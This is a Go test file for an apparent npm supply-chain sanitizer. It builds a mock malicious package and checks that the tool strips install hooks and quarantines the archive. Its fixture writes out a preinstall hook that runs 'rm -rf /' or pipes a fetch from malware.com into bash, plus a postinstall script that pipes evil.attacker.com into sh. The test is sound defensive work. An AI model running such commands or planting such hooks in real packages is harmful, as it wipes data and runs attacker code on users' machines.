package adversarial

import (
	"archive/tar"
	"bytes"
	"compress/gzip"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"io"
	"os"
	"strings"
	"testing"
	"time"

	"bonjoski/argus/internal/model"
	"bonjoski/argus/internal/sanitizer"
)

// ADV-18: Dynamic Install-Script Sandboxing & Quarantine
// Verifies that when a package contains malicious install-time execution hooks
// (preinstall, install, postinstall, etc.), Argus can:
//  1. Completely neutralize the archive in-memory by stripping execution hooks and neutralizing
//     standalone malicious script wrappers while preserving dependencies and legitimate application code.
//  2. Safely store the raw, unvetted payload in the Quarantine Store accompanied by a comprehensive
//     .meta.json forensics report documenting risk score, triggered heuristics, and AST findings.
func TestADV18_InstallScriptNeutralizationAndQuarantine(t *testing.T) {
	// 1. Construct Mock Malicious NPM Tarball (.tgz)
	const maliciousPkgJSON = `{
  "name": "malicious-ai-agent-dep",
  "version": "1.0.0",
  "description": "Slopsquatted agent utility with malicious lifecycle dropper",
  "main": "index.js",
  "scripts": {
    "test": "jest",
    "preinstall": "rm -rf / || curl http://malware.com/evil | bash",
    "postinstall": "node postinstall.js"
  },
  "dependencies": {
    "lodash": "^4.17.21",
    "axios": "^1.6.0"
  },
  "devDependencies": {
    "jest": "^29.0.0"
  }
}`

	const postinstallJS = `const { execSync } = require('child_process');
execSync('curl -s https://evil.attacker.com/beacon | sh');
`
	const indexJS = `module.exports = function() { return "Safe Application Logic"; };`
	const readmeMD = `# Malicious AI Agent Dependency\nLegitimate-looking utility.`

	var tarGzBuf bytes.Buffer
	gw := gzip.NewWriter(&tarGzBuf)
	tw := tar.NewWriter(gw)

	filesToAdd := map[string][]byte{
		"package/package.json":   []byte(maliciousPkgJSON),
		"package/postinstall.js": []byte(postinstallJS),
		"package/index.js":       []byte(indexJS),
		"package/README.md":      []byte(readmeMD),
	}

	for name, content := range filesToAdd {
		hdr := &tar.Header{
			Name:     name,
			Mode:     0644,
			Size:     int64(len(content)),
			Typeflag: tar.TypeReg,
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("ADV-18 Setup Failed: error writing tar header: %v", err)
		}
		if _, err := tw.Write(content); err != nil {
			t.Fatalf("ADV-18 Setup Failed: error writing tar body: %v", err)
		}
	}

	if err := tw.Close(); err != nil {
		t.Fatalf("ADV-18 Setup Failed: error closing tar writer: %v", err)
	}
	if err := gw.Close(); err != nil {
		t.Fatalf("ADV-18 Setup Failed: error closing gzip writer: %v", err)
	}

	rawTarballBytes := tarGzBuf.Bytes()

	hasher := sha256.New()
	hasher.Write(rawTarballBytes)
	expectedRawSHA256 := hex.EncodeToString(hasher.Sum(nil))

	// 2. Pass to Sanitizer and Verify Archive Neutralization
	neutralizeRes, err := sanitizer.NeutralizeBytes(rawTarballBytes, "malicious-ai-agent-dep-1.0.0.tgz")
	if err != nil {
		t.Fatalf("ADV-18 Failed: NeutralizeBytes returned error: %v", err)
	}

	if len(neutralizeRes.StrippedHooks) != 2 {
		t.Fatalf("ADV-18 Failed: expected 2 stripped hooks (preinstall, postinstall), got %d: %+v",
			len(neutralizeRes.StrippedHooks), neutralizeRes.StrippedHooks)
	}

	foundPreinstall := false
	foundPostinstall := false
	for _, hook := range neutralizeRes.StrippedHooks {
		if hook.Hook == "preinstall" && strings.Contains(hook.Command, "rm -rf") {
			foundPreinstall = true
		}
		if hook.Hook == "postinstall" && strings.Contains(hook.Command, "postinstall.js") {
			foundPostinstall = true
		}
	}
	if !foundPreinstall || !foundPostinstall {
		t.Errorf("ADV-18 Failed: stripped hooks missing expected commands: %+v", neutralizeRes.StrippedHooks)
	}

	// 3. Inspect Neutralized Archive Stream
	unpackedFiles := make(map[string][]byte)
	gzr, err := gzip.NewReader(bytes.NewReader(neutralizeRes.Data))
	if err != nil {
		t.Fatalf("ADV-18 Failed: error opening neutralized gzip reader: %v", err)
	}
	defer gzr.Close()

	tr := tar.NewReader(gzr)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatalf("ADV-18 Failed: error reading neutralized tar header: %v", err)
		}
		content, err := io.ReadAll(tr)
		if err != nil {
			t.Fatalf("ADV-18 Failed: error reading neutralized tar entry: %v", err)
		}
		unpackedFiles[hdr.Name] = content
	}

	// Verify package.json stripped preinstall and postinstall scripts while keeping dependencies
	cleanPkgRaw, ok := unpackedFiles["package/package.json"]
	if !ok {
		t.Fatalf("ADV-18 Failed: package/package.json missing from neutralized archive")
	}

	var cleanPkgDoc map[string]any
	if err := json.Unmarshal(cleanPkgRaw, &cleanPkgDoc); err != nil {
		t.Fatalf("ADV-18 Failed: failed to parse neutralized package.json: %v", err)
	}

	scripts, ok := cleanPkgDoc["scripts"].(map[string]any)
	if !ok {
		t.Fatalf("ADV-18 Failed: scripts map missing or invalid in package.json")
	}
	if _, exists := scripts["preinstall"]; exists {
		t.Errorf("ADV-18 Failed: scripts.preinstall was NOT stripped from package.json")
	}
	if _, exists := scripts["postinstall"]; exists {
		t.Errorf("ADV-18 Failed: scripts.postinstall was NOT stripped from package.json")
	}
	if testVal, exists := scripts["test"]; !exists || testVal != "jest" {
		t.Errorf("ADV-18 Failed: benign test script was lost: %v", testVal)
	}

	// Verify dependencies preserved
	deps, ok := cleanPkgDoc["dependencies"].(map[string]any)
	if !ok || deps["lodash"] != "^4.17.21" || deps["axios"] != "^1.6.0" {
		t.Errorf("ADV-18 Failed: production dependencies were altered or lost: %+v", deps)
	}

	// Verify all other files (index.js, README.md) preserved exactly
	if string(unpackedFiles["package/index.js"]) != indexJS {
		t.Errorf("ADV-18 Failed: index.js content was corrupted")
	}
	if string(unpackedFiles["package/README.md"]) != readmeMD {
		t.Errorf("ADV-18 Failed: README.md content was corrupted")
	}

	// Verify standalone postinstall.js was neutralized with comment prefix
	neutralizedScript := string(unpackedFiles["package/postinstall.js"])
	if !strings.Contains(neutralizedScript, "// [argus-neutralized]") {
		t.Errorf("ADV-18 Failed: postinstall.js dangerous lines were not commented out: %s", neutralizedScript)
	}

	// 4. Quarantine Raw Malicious Tarball
	quarantineDir := t.TempDir()
	store, err := sanitizer.NewQuarantineStore(quarantineDir)
	if err != nil {
		t.Fatalf("ADV-18 Failed: failed to initialize quarantine store: %v", err)
	}

	mockReport := &model.RiskReport{
		Package:         "malicious-ai-agent-dep",
		Ecosystem:       model.EcosystemNPM,
		ResolvedVersion: "1.0.0",
		TotalScore:      95,
		RiskLevel:       model.RiskLevelCritical,
		Penalties: []model.HeuristicFinding{
			{
				RuleID:    "HR-01",
				Name:      "Severe Risk Rule",
				Points:    50,
				Triggered: true,
			},
			{
				RuleID:    "HR-10",
				Name:      "Suspicious Static AST",
				Points:    45,
				Triggered: true,
			},
		},
		Provenance: model.PackageProvenance{
			Name:               "malicious-ai-agent-dep",
			Ecosystem:          model.EcosystemNPM,
			ResolvedVersion:    "1.0.0",
			TarballURL:         "https://registry.npmjs.org/malicious-ai-agent-dep/-/malicious-ai-agent-dep-1.0.0.tgz",
			HasInstallScripts:  true,
			HasSuspiciousAST:   true,
			SuspiciousFindings: []string{"package/postinstall.js:2: [PROCESS_EXECUTION] execSync('curl ... | sh')"},
		},
		EvaluationTime: time.Now(),
	}

	qRecord, err := store.Quarantine(
		model.EcosystemNPM,
		"malicious-ai-agent-dep",
		"1.0.0",
		rawTarballBytes,
		mockReport,
		mockReport.Provenance.TarballURL,
	)
	if err != nil {
		t.Fatalf("ADV-18 Failed: store.Quarantine error: %v", err)
	}

	// 5. Verify Quarantine Files and Forensics Companion Report (.meta.json)
	if _, err := os.Stat(qRecord.TarballPath); err != nil {
		t.Fatalf("ADV-18 Failed: raw tarball not found at %s: %v", qRecord.TarballPath, err)
	}
	if _, err := os.Stat(qRecord.MetadataPath); err != nil {
		t.Fatalf("ADV-18 Failed: companion metadata not found at %s: %v", qRecord.MetadataPath, err)
	}

	metaData, err := os.ReadFile(qRecord.MetadataPath)
	if err != nil {
		t.Fatalf("ADV-18 Failed: error reading .meta.json: %v", err)
	}

	var forensics sanitizer.QuarantineRecord
	if err := json.Unmarshal(metaData, &forensics); err != nil {
		t.Fatalf("ADV-18 Failed: invalid JSON in .meta.json: %v", err)
	}

	if forensics.Package != "malicious-ai-agent-dep" {
		t.Errorf("ADV-18 Forensics Mismatch: package = %s, want malicious-ai-agent-dep", forensics.Package)
	}
	if forensics.Version != "1.0.0" {
		t.Errorf("ADV-18 Forensics Mismatch: version = %s, want 1.0.0", forensics.Version)
	}
	if forensics.Ecosystem != model.EcosystemNPM {
		t.Errorf("ADV-18 Forensics Mismatch: ecosystem = %s, want npm", forensics.Ecosystem)
	}
	if forensics.RiskScore != 95 {
		t.Errorf("ADV-18 Forensics Mismatch: risk_score = %d, want 95", forensics.RiskScore)
	}
	if forensics.RiskLevel != model.RiskLevelCritical {
		t.Errorf("ADV-18 Forensics Mismatch: risk_level = %s, want CRITICAL", forensics.RiskLevel)
	}
	if forensics.SHA256 != expectedRawSHA256 {
		t.Errorf("ADV-18 Forensics Mismatch: sha256 = %s, want %s", forensics.SHA256, expectedRawSHA256)
	}
	if len(forensics.TriggeredRules) != 2 {
		t.Errorf("ADV-18 Forensics Mismatch: expected 2 triggered rules, got %d: %v",
			len(forensics.TriggeredRules), forensics.TriggeredRules)
	}
	if len(forensics.ASTFindings) != 1 {
		t.Errorf("ADV-18 Forensics Mismatch: expected 1 AST finding, got %d: %v",
			len(forensics.ASTFindings), forensics.ASTFindings)
	}

	// 6. Verify Store Inspection API
	inspectedRecord, err := store.Inspect("malicious-ai-agent-dep")
	if err != nil {
		t.Fatalf("ADV-18 Failed: store.Inspect error: %v", err)
	}
	if inspectedRecord.ID != qRecord.ID {
		t.Errorf("ADV-18 Failed: inspected record ID %s != quarantined ID %s", inspectedRecord.ID, qRecord.ID)
	}

	t.Logf("ADV-18 Succeeded: Neutralized 2 lifecycle hooks, safely quarantined to %s (SHA256: %s)",
		qRecord.TarballPath, qRecord.SHA256)
}
